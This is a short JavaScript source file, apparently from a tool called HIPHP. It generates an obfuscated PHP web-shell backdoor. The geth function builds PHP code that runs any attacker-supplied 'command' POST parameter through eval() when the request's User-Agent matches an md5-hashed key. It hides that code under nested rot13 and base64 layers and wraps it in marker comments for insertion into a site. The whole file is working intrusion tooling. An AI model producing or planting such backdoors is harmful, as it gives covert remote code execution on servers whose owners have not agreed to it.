//   |                                                          |
// --+----------------------------------------------------------+--
//   |   Code by : yasserbdj96                                  |
//   |   Email   : yasser.bdj96@gmail.com                       |
//   |   Github  : https://github.com/yasserbdj96               |
//   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
// --+----------------------------------------------------------+--  
//   |        all posts #yasserbdj96 ,all views my own.         |
// --+----------------------------------------------------------+--
//   |                                                          |

//START{


//
function rot13(text) {
    return text.replace(/[a-z]/gi, letter => String.fromCharCode(letter.charCodeAt(0) + (letter.toLowerCase() <= 'm' ? 13 : -13)));
} 

//
function tobase64(text){
    return btoa(text);
}

//
function geth(key){
    key = md5(key);
    code="if($_SERVER['HTTP_USER_AGENT']=='"+key+"'){echo'#"+key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}";
    code=rot13(tobase64(rot13(tobase64(rot13(code)))));
    code="eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('"+code+"'))))));";
    php_s="/*HIPHP_HOLE_CODE START*/";
    php_e="/*HIPHP_HOLE_CODE END*/";
    return php_s+"\n"+code+"\n"+php_e;
}

//console.log(geth("123"));
//}END.